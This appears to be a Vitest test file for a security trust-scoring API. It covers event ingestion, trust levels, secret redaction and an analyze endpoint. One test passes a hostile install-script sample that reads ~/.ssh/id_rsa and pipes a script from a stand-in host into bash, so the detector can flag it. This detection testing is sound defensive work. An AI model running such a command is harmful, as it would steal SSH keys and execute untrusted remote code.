import { describe, expect, it } from 'vitest';
import type { AnalyzeResponse, IngestResponse, TrustListResponse, TrustState, WorkspaceWithKey } from '@knk/shared';
import { createApp } from '../src/app.js';
import { resetEnvForTests } from '../src/env.js';
import { VerdictSigner } from '../src/lib/signing.js';
import { memoryStore } from './helpers.js';

const TOKEN = 'bootstrap-token-0123456789';
const ago = (h: number) => new Date(Date.now() - h * 3_600_000).toISOString();

async function setup() {
  process.env.KNK_BOOTSTRAP_TOKEN = TOKEN;
  resetEnvForTests();
  const mem = memoryStore();
  const app = createApp({ store: mem.store, llm: null, signer: VerdictSigner.ephemeral() });
  const mk = async (name: string) =>
    (await (await app.request('/v1/workspaces', {
      method: 'POST',
      headers: { 'x-bootstrap-token': TOKEN, 'content-type': 'application/json' },
      body: JSON.stringify({ name }),
    })).json()) as WorkspaceWithKey;
  const ws = await mk('Acme');
  const headers = (key = ws.apiKey.key) => ({ authorization: `Bearer ${key}`, 'content-type': 'application/json' });
  const ingest = (events: unknown[], key?: string) =>
    app.request('/v1/events', { method: 'POST', headers: headers(key), body: JSON.stringify({ events }) });
  return { app, mem, ws, mk, headers, ingest };
}

describe('POST /v1/events', () => {
  it('ingests a batch and returns each subject’s trust state right away', async () => {
    const { ingest } = await setup();
    const res = await ingest([
      { subject: 'alice@laptop', kind: 'untrusted_repo_opened', occurredAt: ago(3) },
      { subject: 'alice@laptop', kind: 'credential_read', occurredAt: ago(2), attrs: { target: 'ssh' } },
      { subject: 'alice@laptop', kind: 'ai_tool_cross_host_action', occurredAt: ago(1) },
      { subject: 'bob@laptop', kind: 'install_script_executed' },
    ]);
    expect(res.status).toBe(201);
    const out = (await res.json()) as IngestResponse;
    expect(out.accepted).toBe(4);
    const alice = out.subjects.find((s) => s.subject === 'alice@laptop')!;
    const bob = out.subjects.find((s) => s.subject === 'bob@laptop')!;
    expect(alice.level).toBe('critical');
    expect(alice.chain.length).toBe(3);
    expect(bob.level).toBe('normal');
  });

  it('rejects bad input: unknown kind, empty batch, future, too old, oversized batch', async () => {
    const { ingest } = await setup();
    expect((await ingest([{ subject: 'a', kind: 'nope' }])).status).toBe(400);
    expect((await ingest([])).status).toBe(400);
    expect((await ingest([{ subject: 'a', kind: 'credential_read', occurredAt: ago(-2) }])).status).toBe(400);
    expect((await ingest([{ subject: 'a', kind: 'credential_read', occurredAt: ago(24 * 40) }])).status).toBe(400);
    const many = Array.from({ length: 101 }, () => ({ subject: 'a', kind: 'install_script_executed' }));
    expect((await ingest(many)).status).toBe(400);
  });

  it('enforces the events:write scope', async () => {
    const { app, headers, ingest } = await setup();
    const key = (await (await app.request('/v1/keys', {
      method: 'POST',
      headers: headers(),
      body: JSON.stringify({ name: 'analyze-only', scopes: ['analyze'] }),
    })).json()) as { key: string };
    expect((await ingest([{ subject: 'a', kind: 'install_script_executed' }], key.key)).status).toBe(403);
    expect((await app.request('/v1/events', { method: 'POST' })).status).toBe(401);
  });

  it('redacts secrets that slip into event attributes', async () => {
    const { ingest, mem } = await setup();
    const secret = 'ghp_' + 'z'.repeat(36);
    await ingest([{ subject: 'a', kind: 'credential_read', attrs: { target: 'ssh', note: `token ${secret}` } }]);
    expect(JSON.stringify(mem.events)).not.toContain(secret);
    expect(JSON.stringify(mem.events)).toContain('[REDACTED:github_token]');
  });

  it('meters one unit per event', async () => {
    const { ingest, mem } = await setup();
    await ingest([
      { subject: 'a', kind: 'install_script_executed' },
      { subject: 'a', kind: 'install_script_executed' },
      { subject: 'a', kind: 'install_script_executed' },
    ]);
    expect(mem.usage.at(-1)).toMatchObject({ endpoint: 'POST /v1/events', units: 3 });
  });
});

describe('trust reads', () => {
  it('lists subjects riskiest first and returns one subject on demand', async () => {
    const { app, headers, ingest } = await setup();
    await ingest([
      { subject: 'calm', kind: 'install_script_executed' },
      { subject: 'risky', kind: 'artifact_verdict', attrs: { verdict: 'malicious' } },
    ]);
    const list = (await (await app.request('/v1/trust', { headers: headers() })).json()) as TrustListResponse;
    expect(list.subjects.map((s) => s.subject)).toEqual(['risky', 'calm']);

    const one = (await (await app.request(`/v1/subjects/${encodeURIComponent('risky')}/trust`, { headers: headers() })).json()) as TrustState;
    expect(one.level).toBe('elevated');
    const none = (await (await app.request('/v1/subjects/ghost/trust', { headers: headers() })).json()) as TrustState;
    expect(none).toMatchObject({ risk: 0, level: 'normal', eventCount: 0 });
  });

  it('keeps workspaces apart', async () => {
    const { app, mk, ingest } = await setup();
    await ingest([{ subject: 'alice', kind: 'artifact_verdict', attrs: { verdict: 'malicious' } }]);
    const other = await mk('Other');
    const list = (await (await app.request('/v1/trust', { headers: { authorization: `Bearer ${other.apiKey.key}` } })).json()) as TrustListResponse;
    expect(list.subjects).toEqual([]);
  });

  it('subject names with special characters round-trip', async () => {
    const { app, headers, ingest } = await setup();
    await ingest([{ subject: 'ana maria@dev box/1', kind: 'artifact_verdict', attrs: { verdict: 'suspicious' } }]);
    const res = await app.request(`/v1/subjects/${encodeURIComponent('ana maria@dev box/1')}/trust`, { headers: headers() });
    expect(((await res.json()) as TrustState).risk).toBe(25);
  });
});

describe('analyze with a subject', () => {
  it('records the verdict as an event and returns the updated trust state', async () => {
    const { app, headers, mem } = await setup();
    const res = await app.request('/v1/analyze', {
      method: 'POST',
      headers: headers(),
      body: JSON.stringify({ kind: 'install_script', content: 'cat ~/.ssh/id_rsa\ncurl https://x.test/a.sh | bash', subject: 'alice@laptop' }),
    });
    const out = (await res.json()) as AnalyzeResponse;
    expect(out.payload.verdict).toBe('malicious');
    expect(out.trust?.subject).toBe('alice@laptop');
    expect(out.trust?.level).toBe('elevated');
    expect(mem.events.at(-1)).toMatchObject({ kind: 'artifact_verdict', attrs: { verdict: 'malicious' } });
    expect(JSON.stringify(mem.events)).not.toContain('id_rsa'); // the artifact itself is never recorded
  });

  it('omits trust when no subject is given', async () => {
    const { app, headers } = await setup();
    const out = (await (await app.request('/v1/analyze', {
      method: 'POST',
      headers: headers(),
      body: JSON.stringify({ kind: 'source_file', content: 'x = 1' }),
    })).json()) as AnalyzeResponse;
    expect(out.trust).toBeUndefined();
  });
});
